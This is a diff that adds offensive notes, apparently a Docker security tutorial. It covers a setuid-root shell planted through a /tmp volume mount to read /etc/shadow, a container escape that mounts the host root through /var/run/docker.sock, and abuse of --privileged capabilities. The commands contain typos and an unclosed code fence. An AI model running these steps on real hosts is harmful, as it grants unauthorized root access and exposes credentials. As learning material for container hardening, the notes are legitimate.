@@ -77,3 +77,102 @@ docker run -it ubuntu:latest bash
 
 # You can access it from Terminal 1
 ```
+
+### Privilege Escalation
+Getting the root access to the host machine as a non-root user
+
+Four files are required
+- Dockerfile
+```yaml
+FROM alpine:latest
+COPY shellscript.sh shellscript.sh
+COPY shell shell
+```
+- shell.c
+```c
+int main() {
+    setuid(0);
+    system("/bin/sh");
+    return 0;
+}
+```
+- shellscript.sh
+```
+#!/bin/bash
+cp shell /shared/shell
+chmod 4777 /shared/shell
+```
+
+Then we build the image
+```sh
+docker build --rm -t privesc .
+```
+- `shell` binary file under /usr/bin/shell
+
+Then we can run the docker command
+`docker run -v /tmp/:/shared/ privesc:latest /bin/sh shellscript.sh`
+-v : setting the volume to link the /tmp on the local host to the shared folder in the container
+privesc: Name of the image
+/bin/sh shellscript.sh: Entrypoint for the docker run
+
+Navigate to the tmp directory and run the shell, voila you get to acess all the files on the root access
+```sh
+cd /tmp
+./shell
+# id
+# cat /etc/shadow
+```
+
+### Container Breakout techniques
+Existing exploits
+1. Over privileged containers - CAP_SYS_ADMIN, CAP_SYS_MODULE
+2. Dangerous mountpoints - /var/run/docker.sock
+
+### Docker socket (docker.sock)
+- Docker socket is a UNIX socket, which is a backbone for managing containers.
+- When we type Docker commands using docker cli client, it interacts with Docker daemon using the UNIX socket.
+- This socket can be exposed over the network on a specific port - HTTP API.
+- UNIX socket is the default setting.
+- Mounting /var/run/docker.sock into the container is dangerous.
+
+### Container escape using docker.sock
+Getting a shell to start attac
+`dockr run --rm -it -v /var/run/docker.sock:/var/run/docker.sock alpine sh`
+
+Install docker client
+```
+apk udpdate
+apk add -U docker
+
+```sh
+Running another container in within the container and mount the root
+```sh
+docker -H unix:///var/run/docker.sock run -it -v /:/test:ro -t alpine sh
+```
+-H unix:///var/run/docker.sock: Specifying that this is the docker socket that docker can use
+ro: readonly
+
+Now we are inside the new container and we can access the root folder of the host
+```sh
+cd /test/root
+```
+
+### --privileged flag
+- When --privileged flag is used with a container, it will give all Linux capabilities to the container.
+- If an attacker gains access to the container he can take advantage of these capabilities.
+- **cap_sys_admin**, **cap_sys_ptrace** and **cap_sys_module** are some of the dangerous capabilities to be exploited by attacked.
+- When an attacker gains a shell on the container and if it has cap_sys_module enabled, it is possible to load a kernel module directly onto the host’s kernel from within the container.
+
+```sh
+# Using the privilege flag
+docker run -it --privilege alpine sh
+
+# Install
+apk add -U libcap
+
+# Get the list of the privilege capabilities
+capsh --print
+
+```
+
+### Writing to kernel space from a container
